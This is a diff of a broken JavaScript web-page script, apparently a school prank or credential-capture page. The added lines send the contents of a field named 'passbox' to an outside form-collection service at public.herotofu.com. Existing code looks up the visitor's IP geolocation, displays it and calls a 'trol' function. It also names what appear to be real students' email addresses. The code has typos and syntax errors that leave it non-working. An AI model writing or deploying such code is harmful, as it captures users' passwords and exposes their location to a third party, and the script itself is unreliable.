@@ -1,10 +1,13 @@
 window.onload = async function(){
     email = document.getelementbyid('passbox').value
+    macemail = getCookie('mac')
     $.get('log.txt', function(data) {
         if (data.indexOf("felix.wuorenheimo@edu.lomma.se") !== -1) {
             $.getJSON('https://ipapi.co/json/', function(data) {$.when(alert(JSON.stringify(data, null, 2))).then(trol())})
         }
-        else {
+        else if (data.indexOf(macemail) !== -1) {
+            return
+        }else {
             window.loction = "/"
         }
 function getCookie(cname) {
@@ -24,7 +27,7 @@ function getCookie(cname) {
 function onSignIn() {
     document.cookie = "mac="+;
     window.location.reload();
-    sendEmail("https://gmail.com/", {
+    sendEmail("https://public.herotofu.com/v1/b9b0eea0-60de-11ed-b398-5fe41cc942d7", {
     example_user: "felix.goff@edu.lomma.se",
     example_data: email,
 }, onSuccess, onError);
